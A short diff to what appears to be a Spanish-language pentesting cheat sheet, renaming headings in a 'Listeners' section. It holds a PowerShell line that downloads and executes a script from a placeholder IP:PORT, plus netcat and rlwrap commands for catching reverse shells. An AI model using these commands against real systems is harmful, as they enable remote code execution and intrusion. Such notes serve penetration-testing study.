@@ -23,15 +23,15 @@ powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.
 
 ## Listeners
 
-Listener paquetes ICMP
+Paquetes ICMP
 ```
 tcpdump -i NETINTERFACE icmp -n
 ```
-Listener shell nc
+Shell nc
 ```
 nc -lvnp PORT
 ```
-Listener shell chetado
+Shell chetado
 ```
 rlwrap nc -lvnp PORT
 ```
